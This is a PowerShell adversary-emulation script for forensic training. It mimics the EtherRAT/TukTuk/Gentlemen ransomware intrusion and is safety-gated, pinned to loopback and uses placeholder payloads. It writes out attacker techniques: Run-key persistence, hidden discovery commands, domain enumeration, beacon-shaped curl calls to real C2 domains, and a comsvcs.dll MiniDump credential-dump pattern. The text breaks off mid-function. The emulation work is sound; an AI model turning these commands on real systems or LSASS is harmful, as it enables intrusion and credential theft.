#requires -Version 5.1

<#
.SYNOPSIS
    Lab-safe emulation of the EtherRAT/TukTuk/GoTo Resolve/Gentlemen intrusion
    reported by The DFIR Report on 2026-05-11.

.DESCRIPTION
    Creates realistic endpoint artifacts and process telemetry for forensic
    training without downloading malware, contacting external infrastructure,
    accessing real credentials, moving laterally, changing real Group Policy,
    disabling defenses, clearing logs, deleting shadow copies, or encrypting
    user data.

    All impact is limited to synthetic canary data created by this script.
    IOC network attempts are pinned to 127.0.0.1 and bypass proxy settings.
    Artifacts are intentionally left in place until Cleanup is requested.

.PARAMETER Action
    Simulate (default) or Cleanup.

.PARAMETER ConfirmLab
    Required acknowledgement that the target is an authorized lab system.

.PARAMETER AllowDomainJoinedLab
    Permits execution on a domain-joined lab member. Domain controllers are
    always refused. No remote execution or real GPO changes are performed.

.PARAMETER EnableServiceArtifact
    When elevated, creates a disabled, inert service whose name resembles the
    observed GoTo Resolve service. It is recorded for cleanup and never started.

.PARAMETER EnableScheduledTaskArtifact
    Creates a disabled, inert local scheduled task under \DFIR-Lab\. It never
    executes ransomware and does not modify Group Policy or SYSVOL.

.PARAMETER Phase
    Runs all phases by default or a selected subset.

.PARAMETER RunId
    Required for Cleanup. Use the RunId printed by a prior simulation.

.EXAMPLE
    .\Invoke-GentlemenEmulation.ps1 -ConfirmLab

.EXAMPLE
    .\Invoke-GentlemenEmulation.ps1 -ConfirmLab -AllowDomainJoinedLab `
        -EnableServiceArtifact -EnableScheduledTaskArtifact

.EXAMPLE
    .\Invoke-GentlemenEmulation.ps1 -Action Cleanup -ConfirmLab `
        -RunId GENT-20260814T120000Z-1a2b3c4d

.NOTES
    Source: https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
    This is a defensive training utility, not malware.
#>

[CmdletBinding()]
param(
    [ValidateSet('Simulate', 'Cleanup')]
    [string]$Action = 'Simulate',

    [switch]$ConfirmLab,
    [switch]$AllowDomainJoinedLab,
    [switch]$EnableServiceArtifact,
    [switch]$EnableScheduledTaskArtifact,

    [ValidateSet(
        'All',
        'InitialAccess',
        'PersistenceAndC2',
        'Discovery',
        'TukTuk',
        'CredentialAccess',
        'LateralMovement',
        'CollectionAndExfiltration',
        'DefenseEvasion',
        'Impact'
    )]
    [string[]]$Phase = @('All'),

    [ValidateRange(0, 60)]
    [int]$StepDelaySeconds = 1,

    [string]$RunId
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$script:ScenarioName = 'EtherRAT-TukTuk-Gentlemen'
$script:LabBase = Join-Path $env:LOCALAPPDATA 'DFIR-Lab\Gentlemen-Emulation'
$script:ProcessCounter = 0
$script:TimelinePath = $null
$script:ProcessLogPath = $null
$script:RunRoot = $null
$script:StatePath = $null
$script:State = $null

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]::new($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-SelectedPhase {
    param([Parameter(Mandatory)][string]$Name)
    return (($Phase -contains 'All') -or ($Phase -contains $Name))
}

function Assert-SafeRunId {
    param([Parameter(Mandatory)][string]$Value)

    if ($Value -notmatch '^GENT-[0-9]{8}T[0-9]{6}Z-[0-9a-f]{8}$') {
        throw "Invalid RunId '$Value'. Refusing to resolve a cleanup target."
    }
}

function Assert-PathWithin {
    param(
        [Parameter(Mandatory)][string]$Path,
        [Parameter(Mandatory)][string]$Parent
    )

    $fullPath = [IO.Path]::GetFullPath($Path)
    $fullParent = [IO.Path]::GetFullPath($Parent).TrimEnd('\') + '\'
    if (-not $fullPath.StartsWith($fullParent, [StringComparison]::OrdinalIgnoreCase)) {
        throw "Safety boundary violation: '$fullPath' is outside '$fullParent'."
    }
}

function Save-LabState {
    if ($null -eq $script:State -or [string]::IsNullOrWhiteSpace($script:StatePath)) {
        return
    }

    $script:State | ConvertTo-Json -Depth 8 | Set-Content -LiteralPath $script:StatePath -Encoding UTF8
}

function Add-CreatedPath {
    param([Parameter(Mandatory)][string]$Path)

    if ($script:State.CreatedPaths -notcontains $Path) {
        $script:State.CreatedPaths += $Path
        Save-LabState
    }
}

function Write-LabEvent {
    param(
        [Parameter(Mandatory)][string]$PhaseName,
        [Parameter(Mandatory)][string]$ActionName,
        [string[]]$Techniques = @(),
        [string]$Artifact = '',
        [ValidateSet('ExecutedSafe', 'SyntheticOnly', 'Blocked', 'Skipped', 'Information')]
        [string]$Disposition = 'Information',
        [string]$Details = ''
    )

    $event = [ordered]@{
        TimestampUtc = [DateTime]::UtcNow.ToString('o')
        RunId        = $script:State.RunId
        Scenario     = $script:ScenarioName
        Phase        = $PhaseName
        Action       = $ActionName
        Techniques   = $Techniques
        Artifact     = $Artifact
        Disposition  = $Disposition
        Details      = $Details
    }

    Add-Content -LiteralPath $script:TimelinePath -Value ($event | ConvertTo-Json -Compress -Depth 6) -Encoding UTF8
    Write-Host ('[{0}] {1}: {2}' -f $Disposition, $PhaseName, $ActionName)
}

function Invoke-LabProcess {
    param(
        [Parameter(Mandatory)][string]$PhaseName,
        [Parameter(Mandatory)][string]$FilePath,
        [string[]]$ArgumentList = @(),
        [string[]]$Techniques = @(),
        [string]$Description = ''
    )

    $resolved = Get-Command $FilePath -ErrorAction SilentlyContinue
    if ($null -eq $resolved -and -not (Test-Path -LiteralPath $FilePath)) {
        Write-LabEvent -PhaseName $PhaseName -ActionName "Process unavailable: $FilePath" `
            -Techniques $Techniques -Disposition Skipped -Details $Description
        return $null
    }

    $script:ProcessCounter++
    $displayCommand = (@($FilePath) + $ArgumentList) -join ' '
    $outputPath = Join-Path $script:RunRoot ('ProcessLogs\{0:D3}.txt' -f $script:ProcessCounter)
    $exitCode = $null

    Write-LabEvent -PhaseName $PhaseName -ActionName 'Process start' -Techniques $Techniques `
        -Artifact $displayCommand -Disposition ExecutedSafe -Details $Description

    try {
        $processOutput = & $FilePath @ArgumentList 2>&1
        $exitCode = $LASTEXITCODE
        @(
            "Command: $displayCommand"
            "ExitCode: $exitCode"
            'Output:'
            ($processOutput | Out-String)
        ) | Set-Content -LiteralPath $outputPath -Encoding UTF8
    }
    catch {
        @(
            "Command: $displayCommand"
            'ExitCode: exception'
            "Exception: $($_.Exception.Message)"
        ) | Set-Content -LiteralPath $outputPath -Encoding UTF8

        Write-LabEvent -PhaseName $PhaseName -ActionName 'Process error (scenario continued)' `
            -Techniques $Techniques -Artifact $displayCommand -Disposition Information `
            -Details $_.Exception.Message
    }

    return $exitCode
}

function Invoke-LabCmd {
    param(
        [Parameter(Mandatory)][string]$PhaseName,
        [Parameter(Mandatory)][string]$Command,
        [string[]]$Techniques = @(),
        [string]$Description = '',
        [string]$Launcher = $env:ComSpec
    )

    $result = Invoke-LabProcess -PhaseName $PhaseName -FilePath $Launcher `
        -ArgumentList @('/d', '/s', '/c', $Command) -Techniques $Techniques `
        -Description $Description
    return $result
}

function Start-LoopbackIocAttempt {
    param(
        [Parameter(Mandatory)][string]$PhaseName,
        [Parameter(Mandatory)][string]$HostName,
        [ValidateSet('http', 'https')][string]$Scheme = 'https',
        [string]$Launcher = $env:ComSpec,
        [string[]]$Techniques = @('T1102')
    )

    $port = if ($Scheme -eq 'https') { 443 } else { 80 }
    $url = '{0}://{1}/dfir-lab/{2}' -f $Scheme, $HostName, $script:State.RunId
    $command = 'curl.exe --noproxy "*" --silent --show-error --connect-timeout 1 --max-time 2 --resolve "{0}:{1}:127.0.0.1" "{2}" >nul 2>&1' -f $HostName, $port, $url

    Invoke-LabCmd -PhaseName $PhaseName -Command $command -Launcher $Launcher `
        -Techniques $Techniques `
        -Description "IOC hostname is forcibly mapped to 127.0.0.1; proxy use is disabled. No external connection is made." | Out-Null

    Write-LabEvent -PhaseName $PhaseName -ActionName 'Synthetic network event' `
        -Techniques $Techniques -Artifact $HostName -Disposition SyntheticOnly `
        -Details "Destination=127.0.0.1 Port=$port OriginalHost=$HostName Scheme=$Scheme"
}

function Write-ScenarioMetadata {
    $metadata = [ordered]@{
        Name = $script:ScenarioName
        Report = [ordered]@{
            Title = 'Flash Alert: EtherRAT and TukTuk C2 End in The Gentleman Ransomware'
            Publisher = 'The DFIR Report'
            Published = '2026-05-11'
            Url = 'https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/'
        }
        SafetyBoundary = @(
            'No malware is downloaded or embedded.'
            'Every IOC connection is forced to 127.0.0.1 with proxy use disabled.'
            'No LSASS or NTDS secrets are accessed.'
            'No remote system is contacted for lateral movement.'
            'No Defender setting, event log, shadow copy, VM, GPO, or SYSVOL is changed.'
            'Only script-generated canary files are renamed during impact.'
        )
        Iocs = [ordered]@{
            Domains = @(
                '1rpc.io',
                'witch-skins-lip-coal.trycloudflare.com',
                'fields-pct-easier-vancouver.trycloudflare.com',
                'howto-tar-naturals-coordination.trycloudflare.com',
                'workshop-lighting-protective-customs.trycloudflare.com',
                'afford-effect-construct-tricks.trycloudflare.com',
                'rapids-lil-lending-charleston.trycloudflare.com',
                'when-architectural-cdna-faster.trycloudflare.com',
                'mode-exit-legendary-trusted.trycloudflare.com',
                'seasonal-estimation-heating-necessarily.trycloudflare.com',
                'entered-medications-motherboard-advanced.trycloudflare.com',
                'walt-messaging-affairs-occurring.trycloudflare.com',
                'vefbdzzuaadnascpeqcn.supabase.co',
                'k135neflez.westus3.azure.clickhouse.cloud',
                'borjumaniya.store',
                'vngz3ntdrb.us-east1.gcp.clickhouse.cloud',
                'muurfzqprzmdkzoibxaz.supabase.co',
                'ep-lively-cherry-a80bmwii.eastus2.azure.neon.tech'
            )
            EthereumContracts = @(
                '0xdf0b529043ef7a2bb9111bad26de624a326bacf9',
                '0x5953f27F044779a3AFCd2BF56a4B712583Dd2E4e'
            )
            ArweaveDriveId = 'a6278417-39f4-407e-90bf-599f74726e66'
            Files = [ordered]@{
                'RAMMap.msi' = [ordered]@{
                    MD5 = '73ce2438d4ed475e03727b7b000d2794'
                    SHA1 = '3d5ee8429ef00824c0351cba507dfeb92b54f83b'
                    SHA256 = 'd9487fdc097f770e5661f9e5dee130068cb179d33716abff1a21c8cb901f25a6'
                }
                'MVnVmUYj.cmd' = [ordered]@{
                    MD5 = 'b2d51212744f404714fd909e87254d98'
                    SHA1 = 'c98ee41f09ae079a5643626f57eb84f92205bb2b'
                    SHA256 = '8c2665adf8bfab65463f2a9bd1b7bb0231de3f5c1e6a2e51479e44aaac2e7bf0'
                }
                'A7Pnj975bl.cfg' = [ordered]@{
                    MD5 = 'c92cf9a1af5b1fe25cdcb8771ce52be4'
                    SHA1 = 'b44c8084b88d31113ee51758740eb84c251bdae8'
                    SHA256 = '4142d5efd4ea2abab77f2f0a917610e2ff976bf9e19d7ad1e9156eccdc5412db'
                }
                'v72HYLU3OpRBznc.ini' = [ordered]@{
                    MD5 = '77fbe265fd65c7f7b6d323fb6de6a4fd'
                    SHA1 = '114ec028a3fc4ed50056ee8166b0c39acff6ff03'
                    SHA256 = '2d4b4bb18b8445e49eeda571982874403befcecf78266e3d405f6529d98bee46'
                }
                'log4net.dll' = [ordered]@{
                    MD5 = 'f985b8d6d635c266fc4779dad77aa75c'
                    SHA1 = 'ba80d7b038758a129861e1e498e462cc3d68ae20'
                    SHA256 = '19021e53b9929fdf4b7d0e0707434d56bb73c1a9b7403c8837b44d1c417198dc'
                }
                'smokymo.msi' = [ordered]@{
                    MD5 = 'b188fbc6ff5557767e73e4c883a553a3'
                    SHA1 = 'aa9218994798ae31a19d3e7e39cfac2e2ee55840'
                    SHA256 = '1795eacd2c58894ccdd6be8854fe6456c3b069a3a873432343b57b475b256aee'
                }
            }
        }
    }

    $metadata | ConvertTo-Json -Depth 8 | Set-Content `
        -LiteralPath (Join-Path $script:RunRoot 'Scenario.json') -Encoding UTF8
}

function Initialize-Simulation {
    if (-not $ConfirmLab) {
        throw 'Refusing to run. Re-run with -ConfirmLab on an authorized isolated lab machine.'
    }

    if ($env:OS -ne 'Windows_NT') {
        throw 'This scenario must run on Windows PowerShell 5.1 or later.'
    }

    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystem
    if ([int]$computerSystem.DomainRole -ge 4) {
        throw 'Domain controllers are outside this simulator safety boundary. Use a member workstation/server lab VM.'
    }

    if ([bool]$computerSystem.PartOfDomain -and -not $AllowDomainJoinedLab) {
        throw 'This machine is domain joined. Re-run only in an authorized lab with -AllowDomainJoinedLab.'
    }

    $script:RunId = 'GENT-{0}-{1}' -f [DateTime]::UtcNow.ToString('yyyyMMddTHHmmssZ'), ([Guid]::NewGuid().ToString('N').Substring(0, 8))
    Assert-SafeRunId -Value $script:RunId

    $script:RunRoot = Join-Path $script:LabBase $script:RunId
    Assert-PathWithin -Path $script:RunRoot -Parent $script:LabBase
    if (Test-Path -LiteralPath $script:RunRoot) {
        throw "Run directory already exists: $script:RunRoot"
    }

    New-Item -Path $script:RunRoot -ItemType Directory -Force | Out-Null
    New-Item -Path (Join-Path $script:RunRoot 'ProcessLogs') -ItemType Directory -Force | Out-Null
    $script:TimelinePath = Join-Path $script:RunRoot 'Timeline.jsonl'
    $script:ProcessLogPath = Join-Path $script:RunRoot 'ProcessLogs'
    $script:StatePath = Join-Path $script:RunRoot 'State.json'

    $script:State = [ordered]@{
        RunId = $script:RunId
        Scenario = $script:ScenarioName
        CreatedUtc = [DateTime]::UtcNow.ToString('o')
        CreatedPaths = @($script:RunRoot)
        RegistryValues = @()
        Services = @()
        ScheduledTasks = @()
    }

    Save-LabState
    Write-ScenarioMetadata
    Write-LabEvent -PhaseName 'Safety' -ActionName 'Lab safety gate passed' `
        -Disposition Information -Artifact $script:RunRoot `
        -Details "DomainJoined=$($computerSystem.PartOfDomain); Elevated=$(Test-IsAdministrator)"
}

function New-CanaryCorpus {
    $canaryRoot = Join-Path $script:RunRoot 'CanaryData'
    $folders = @('Finance', 'Legal', 'Engineering', 'HR')

    foreach ($folder in $folders) {
        $path = Join-Path $canaryRoot $folder
        New-Item -Path $path -ItemType Directory -Force | Out-Null

        1..4 | ForEach-Object {
            $content = @(
                'DFIR LAB SYNTHETIC CANARY - NO REAL DATA'
                "RunId=$($script:RunId)"
                "Department=$folder"
                "Record=$_"
                "Nonce=$([Guid]::NewGuid())"
            ) -join [Environment]::NewLine
            Set-Content -LiteralPath (Join-Path $path ("FY26-{0:D3}.txt" -f $_)) -Value $content -Encoding UTF8
        }
    }

    Copy-Item -LiteralPath $canaryRoot -Destination (Join-Path $script:RunRoot 'CanaryOriginals') -Recurse
    Write-LabEvent -PhaseName 'Preparation' -ActionName 'Synthetic canary corpus created' `
        -Artifact $canaryRoot -Disposition ExecutedSafe -Techniques @('T1486') `
        -Details 'All later file-impact activity is confined to this generated corpus.'
}

function Invoke-InitialAccessPhase {
    $phaseName = 'InitialAccess'
    Write-Host "`n=== Initial access and execution ==="

    $downloads = Join-Path $env:USERPROFILE 'Downloads'
    if (-not (Test-Path -LiteralPath $downloads)) {
        $downloads = Join-Path $script:RunRoot 'Lure'
        New-Item -Path $downloads -ItemType Directory -Force | Out-Null
    }

    $lurePath = Join-Path $downloads 'RAMMap.msi'
    if (Test-Path -LiteralPath $lurePath) {
        $lurePath = Join-Path $downloads ("RAMMap-{0}.msi" -f $script:RunId)
    }

    @(
        'DFIR LAB PLACEHOLDER - NOT A WINDOWS INSTALLER'
        "RunId=$($script:RunId)"
        'Reported lure: Sysinternals RAMMap'
        'Reported SHA256 retained only in Scenario.json'
    ) | Set-Content -LiteralPath $lurePath -Encoding UTF8
    Add-CreatedPath -Path $lurePath

    Invoke-LabProcess -PhaseName $phaseName -FilePath 'msiexec.exe' `
        -ArgumentList @('/i', $lurePath, '/qn', '/norestart') `
        -Techniques @('T1204.002', 'T1218.007', 'T1036') `
        -Description 'The placeholder MSI is intentionally invalid; msiexec should fail closed while producing process telemetry.' | Out-Null

    $etherStage = Join-Path $env:LOCALAPPDATA ("P2RsupmqXnmx-{0}\gksVMg" -f $script:RunId)
    New-Item -Path $etherStage -ItemType Directory -Force | Out-Null
    Add-CreatedPath -Path (Split-Path -Parent $etherStage)

    $batchPath = Join-Path $etherStage 'MVnVmUYj.cmd'
    $batchMarker = Join-Path $etherStage 'initial-execution.marker'
    @"
@echo off
rem DFIR LAB SAFE ETHER RAT INSTALLER EMULATION
echo RunId=$($script:RunId)>"$batchMarker"
exit /b 0
"@ | Set-Content -LiteralPath $batchPath -Encoding ASCII

    $launchCommand = 'start /wait /min "" "{0}"' -f $batchPath
    Invoke-LabCmd -PhaseName $phaseName -Command $launchCommand `
        -Techniques @('T1059.003', 'T1204.002') `
        -Description 'Benign batch stage with the report-observed filename.' | Out-Null

    $zipPath = Join-Path $env:TEMP ("9gY0LJMyXW-{0}.zip" -f $script:RunId)
    $downloadCommand = 'curl.exe --noproxy "*" --silent --show-error --connect-timeout 1 --max-time 2 --resolve "nodejs.org:443:127.0.0.1" -o "{0}" "https://nodejs.org/dist/v18.20.5/node-v18.20.5-win-x64.zip"' -f $zipPath
    Invoke-LabCmd -PhaseName $phaseName -Command $downloadCommand `
        -Techniques @('T1105') `
        -Description 'Download-shaped telemetry pinned to loopback; no Node.js package is retrieved.' | Out-Null

    @(
        'DFIR LAB PLACEHOLDER - NOT NODE.JS'
        "RunId=$($script:RunId)"
    ) | Set-Content -LiteralPath $zipPath -Encoding UTF8
    Add-CreatedPath -Path $zipPath

    $nodePath = Join-Path $etherStage 'node.exe'
    Copy-Item -LiteralPath (Join-Path $env:WINDIR 'System32\cmd.exe') -Destination $nodePath
    @(
        '// DFIR LAB INERT JAVASCRIPT CONFIG PLACEHOLDER'
        "// RunId=$($script:RunId)"
        '// Reported behavior: EtherHiding C2 resolver'
    ) | Set-Content -LiteralPath (Join-Path $etherStage 'A7Pnj975bl.cfg') -Encoding UTF8
    @(
        '[DFIR-LAB]'
        "RunId=$($script:RunId)"
        'NetworkMode=LoopbackOnly'
    ) | Set-Content -LiteralPath (Join-Path $etherStage 'v72HYLU3OpRBznc.ini') -Encoding UTF8

    $script:State.EtherStage = $etherStage
    $script:State.NodePath = $nodePath
    Save-LabState

    Write-LabEvent -PhaseName $phaseName -ActionName 'EtherRAT-shaped staging completed' `
        -Techniques @('T1036', 'T1059.007', 'T1105') -Artifact $etherStage `
        -Disposition ExecutedSafe -Details 'node.exe is a renamed copy of cmd.exe; payload files are inert text.'
    Start-Sleep -Seconds $StepDelaySeconds
}

function Invoke-PersistenceAndC2Phase {
    $phaseName = 'PersistenceAndC2'
    Write-Host "`n=== EtherRAT persistence and blockchain/SaaS C2 ==="

    if (-not $script:State.Contains('NodePath')) {
        $fallback = Join-Path $script:RunRoot 'EtherFallback'
        New-Item -Path $fallback -ItemType Directory -Force | Out-Null
        $nodePath = Join-Path $fallback 'node.exe'
        Copy-Item -LiteralPath (Join-Path $env:WINDIR 'System32\cmd.exe') -Destination $nodePath
        $script:State.NodePath = $nodePath
        $script:State.EtherStage = $fallback
        Save-LabState
    }

    $runKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $valueName = 'AppResolver'
    $existing = Get-ItemProperty -Path $runKeyPath -Name $valueName -ErrorAction SilentlyContinue
    if ($null -ne $existing) {
        $valueName = "AppResolver_DFIRLab_$($script:RunId)"
    }

    $runData = 'conhost.exe --headless "{0}" /d /c "exit 0" REM DFIRLAB-{1}' -f $script:State.NodePath, $script:RunId
    Invoke-LabProcess -PhaseName $phaseName -FilePath 'reg.exe' `
        -ArgumentList @(
            'add',
            'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
            '/v', $valueName,
            '/t', 'REG_SZ',
            '/d', $runData,
            '/f'
        ) -Techniques @('T1547.001') `
        -Description 'Creates the inert Run value using the report-observed registry command-line pattern.' | Out-Null
    New-ItemProperty -Path $runKeyPath -Name $valueName -Value $runData -PropertyType String -Force | Out-Null
    $script:State.RegistryValues += [ordered]@{
        Path = $runKeyPath
        Name = $valueName
        ExpectedData = $runData
    }
    Save-LabState

    Write-LabEvent -PhaseName $phaseName -ActionName 'Registry Run persistence created' `
        -Techniques @('T1547.001') -Artifact "$runKeyPath\$valueName" `
        -Disposition ExecutedSafe -Details 'The persisted command exits immediately and has no network or payload behavior.'

    $cfgPath = Join-Path $script:State.EtherStage 'A7Pnj975bl.cfg'
    Invoke-LabProcess -PhaseName $phaseName -FilePath $script:State.NodePath `
        -ArgumentList @('/d', '/c', 'type', $cfgPath) `
        -Techniques @('T1059.007', 'T1036') `
        -Description 'Renamed cmd.exe produces node.exe process telemetry while reading only an inert config.' | Out-Null

    $etherDomains = @(
        '1rpc.io',
        'witch-skins-lip-coal.trycloudflare.com',
        'fields-pct-easier-vancouver.trycloudflare.com',
        'howto-tar-naturals-coordination.trycloudflare.com'
    )
    foreach ($domain in $etherDomains) {
        Start-LoopbackIocAttempt -PhaseName $phaseName -HostName $domain `
            -Launcher $script:State.NodePath -Techniques @('T1102.002', 'T1102.003')
    }

    @(
        'DFIR LAB SYNTHETIC ETHEREUM RESPONSE'
        'contract=0xdf0b529043ef7a2bb9111bad26de624a326bacf9'
        'resolved_c2=witch-skins-lip-coal.trycloudflare.com'
        'network=loopback-only'
    ) | Set-Content -LiteralPath (Join-Path $script:State.EtherStage 'ethereum-config-response.txt') -Encoding UTF8

    Start-Sleep -Seconds $StepDelaySeconds
}

function Invoke-DiscoveryPhase {
    $phaseName = 'Discovery'
    Write-Host "`n=== Host, security product, network, and domain discovery ==="

    $commands = @(
        [ordered]@{ Command = 'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "[System.Globalization.CultureInfo]::InstalledUICulture.Name"'; Technique = @('T1614.001') },
        [ordered]@{ Command = 'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "(Get-CimInstance Win32_VideoController).Name -join '', ''"'; Technique = @('T1082') },
        [ordered]@{ Command = 'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA Stop).displayName -join '', '' } catch { ''none'' }"'; Technique = @('T1518.001') },
        [ordered]@{ Command = 'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "(Get-CimInstance Win32_ComputerSystem).Domain"'; Technique = @('T1087.002') },
        [ordered]@{ Command = 'reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName'; Technique = @('T1082') },
        [ordered]@{ Command = 'reg.exe query "HKLM\SOFTWARE\Microsoft\Cryptography" /v MachineGuid'; Technique = @('T1012') },
        [ordered]@{ Command = 'whoami.exe /all'; Technique = @('T1033') },
        [ordered]@{ Command = 'ipconfig.exe /all'; Technique = @('T1016') },
        [ordered]@{ Command = 'arp.exe -a'; Technique = @('T1016') },
        [ordered]@{ Command = 'route.exe print'; Technique = @('T1016') },
        [ordered]@{ Command = 'tasklist.exe /v'; Technique = @('T1057') },
        [ordered]@{ Command = 'net.exe user'; Technique = @('T1087.001') },
        [ordered]@{ Command = 'net.exe localgroup administrators'; Technique = @('T1069.001') }
    )

    foreach ($item in $commands) {
        Invoke-LabCmd -PhaseName $phaseName -Command $item.Command `
            -Techniques $item.Technique -Description 'Read-only native discovery.' | Out-Null
    }

    if ($AllowDomainJoinedLab) {
        $domainCommands = @(
            'net.exe group "Domain Admins" /domain',
            'net.exe group "Enterprise Admins" /domain',
            'nltest.exe /domain_trusts /all_trusts'
        )
        foreach ($command in $domainCommands) {
            Invoke-LabCmd -PhaseName $phaseName -Command $command `
                -Techniques @('T1069.002', 'T1482') `
                -Description 'Read-only query permitted only by -AllowDomainJoinedLab.' | Out-Null
        }
    }
    else {
        Write-LabEvent -PhaseName $phaseName -ActionName 'Domain-wide discovery not executed' `
            -Techniques @('T1069.002', 'T1482') -Disposition Blocked `
            -Details 'Use -AllowDomainJoinedLab only on an authorized member-system lab.'
    }

    $netscanPath = Join-Path $env:TEMP ("netscan-{0}.exe" -f $script:RunId)
    Copy-Item -LiteralPath (Join-Path $env:WINDIR 'System32\cmd.exe') -Destination $netscanPath
    Add-CreatedPath -Path $netscanPath
    Invoke-LabCmd -PhaseName $phaseName -Launcher $netscanPath `
        -Command 'ipconfig.exe /all' -Techniques @('T1018', 'T1036') `
        -Description 'SoftPerfect-shaped process artifact performs local configuration discovery only; it does not scan.' | Out-Null

    Write-LabEvent -PhaseName $phaseName -ActionName 'Network scanning withheld' `
        -Techniques @('T1018', 'T1046') -Artifact $netscanPath -Disposition Blocked `
        -Details 'The renamed signed binary ran ipconfig only. No hosts or ports were scanned.'
    Start-Sleep -Seconds $StepDelaySeconds
}

function New-RenamedCmdShim {
    param(
        [Parameter(Mandatory)][string]$Directory,
        [Parameter(Mandatory)][string]$Name
    )

    New-Item -Path $Directory -ItemType Directory -Force | Out-Null
    $path = Join-Path $Directory $Name
    Copy-Item -LiteralPath (Join-Path $env:WINDIR 'System32\cmd.exe') -Destination $path -Force
    return $path
}

function Invoke-TukTukPhase {
    $phaseName = 'TukTuk'
    Write-Host "`n=== TukTuk DLL sideloading and resilient SaaS C2 ==="

    $tuktukRoot = Join-Path $script:RunRoot 'TukTuk'
    $launchers = @()
    foreach ($name in @('Greenshot.exe', 'SyncTrayzor.exe', 'docfx.exe', 'Cake.exe')) {
        $toolDir = Join-Path $tuktukRoot ([IO.Path]::GetFileNameWithoutExtension($name))
        $launcher = New-RenamedCmdShim -Directory $toolDir -Name $name
        @(
            'DFIR LAB PLACEHOLDER - NOT A DLL'
            "RunId=$($script:RunId)"
            'Reported TukTuk filename: log4net.dll'
        ) | Set-Content -LiteralPath (Join-Path $toolDir 'log4net.dll') -Encoding UTF8

        Invoke-LabCmd -PhaseName $phaseName -Launcher $launcher `
            -Command ('echo DFIRLAB TukTuk launcher {0} run {1}' -f $name, $script:RunId) `
            -Techniques @('T1574.001', 'T1036') `
            -Description 'No DLL is loaded; the adjacent log4net.dll is inert text.' | Out-Null
        $launchers += $launcher
    }

    $script:State.TukTukLaunchers = $launchers
    Save-LabState

    $c2Domains = @(
        'vefbdzzuaadnascpeqcn.supabase.co',
        'k135neflez.westus3.azure.clickhouse.cloud',
        'arweave.net',
        'goldsky.arweave.net',
        'g8way.io',
        'rest.ably.io',
        'api.dropboxapi.com',
        'api.github.com',
        'slack.com',
        'borjumaniya.store'
    )

    for ($index = 0; $index -lt $c2Domains.Count; $index++) {
        $launcher = $launchers[$index % $launchers.Count]
        Start-LoopbackIocAttempt -PhaseName $phaseName -HostName $c2Domains[$index] `
            -Launcher $launcher -Techniques @('T1102.002', 'T1102.003')
    }

    @(
        'DFIR LAB SYNTHETIC ARWEAVE DEAD-DROP RESPONSE'
        'Drive-Id=a6278417-39f4-407e-90bf-599f74726e66'
        'CredentialPool=REDACTED-NOT-PRESENT'
        'Transports=ClickHouse,Supabase,Ably,Dropbox,GitHub,HTTP'
    ) | Set-Content -LiteralPath (Join-Path $tuktukRoot 'arweave-dead-drop.txt') -Encoding UTF8

    Write-LabEvent -PhaseName $phaseName -ActionName 'TukTuk sideloading represented without DLL execution' `
        -Techniques @('T1574.001') -Artifact $tuktukRoot -Disposition SyntheticOnly `
        -Details 'Renamed Microsoft cmd.exe copies provide process-name telemetry; log4net.dll files are text.'
    Start-Sleep -Seconds $StepDelaySeconds
}

function Invoke-CredentialAccessPhase {
    $phaseName = 'CredentialAccess'
    Write-Host "`n=== Kerberoasting and credential-access telemetry ==="

    $credentialRoot = Join-Path $script:RunRoot 'CredentialAccess'
    New-Item -Path $credentialRoot -ItemType Directory -Force | Out-Null

    if ($AllowDomainJoinedLab) {
        Invoke-LabProcess -PhaseName $phaseName -FilePath 'setspn.exe' -ArgumentList @('-Q', '*/*') `
            -Techniques @('T1558.003') `
            -Description 'Read-only SPN discovery; no service ticket is requested or cracked.' | Out-Null
    }
    else {
        Write-LabEvent -PhaseName $phaseName -ActionName 'SPN query not executed' `
            -Techniques @('T1558.003') -Disposition Blocked `
            -Details 'Synthetic Kerberoast material is generated instead.'
    }

    @(
        '# SYNTHETIC HASH - NOT DERIVED FROM ACTIVE DIRECTORY'
        '$krb5tgs$23$*svc_backup$DFIRLAB.LOCAL$fake-spn*$00000000000000000000000000000000$DFIRLAB'
        "RunId=$($script:RunId)"
    ) | Set-Content -LiteralPath (Join-Path $credentialRoot 'kerberoast-synthetic.txt') -Encoding UTF8

    $mimikatzPath = New-RenamedCmdShim -Directory $credentialRoot -Name 'mimikatz.exe'
    Invoke-LabCmd -PhaseName $phaseName -Launcher $mimikatzPath `
        -Command 'echo SIMULATION ONLY - sekurlsa::logonpasswords was NOT executed and LSASS was NOT opened' `
        -Techniques @('T1003.001', 'T1036') `
        -Description 'Renamed cmd.exe emits only a marker. It contains no Mimikatz code.' | Out-Null

    $notepad = $null
    $dumpPath = Join-Path $credentialRoot 'sacrificial-notepad.dmp'
    try {
        $notepadPath = Join-Path $env:WINDIR 'System32\notepad.exe'
        if (Test-Path -LiteralPath $notepadPath) {
            $notepad = Start-Process -FilePath $notepadPath -PassThru
            Start-Sleep -Milliseconds 500
            Invoke-LabProcess -PhaseName $phaseName -FilePath 'rundll32.exe' `
                -ArgumentList @(
                    (Join-Path $env:WINDIR 'System32\comsvcs.dll,MiniDump'),
                    [string]$notepad.Id,
                    $dumpPath,
                    'full'
                ) `
                -Techniques @('T1003.001') `
                -Description "Safe MiniDump target is script-started notepad PID $($notepad.Id), never LSASS." | Out-Null
        }
        else {
            Write-LabEvent -PhaseName $phaseName -ActionName 'Sacrificial process dump unavailable' `
                -Techniques @('T1003.001') -Disposition Skipped -Details 'notepad.exe is unavailable.'
        }
    }
    finally {
        if ($null -ne $notepad -and -not $notepad.HasExited) {
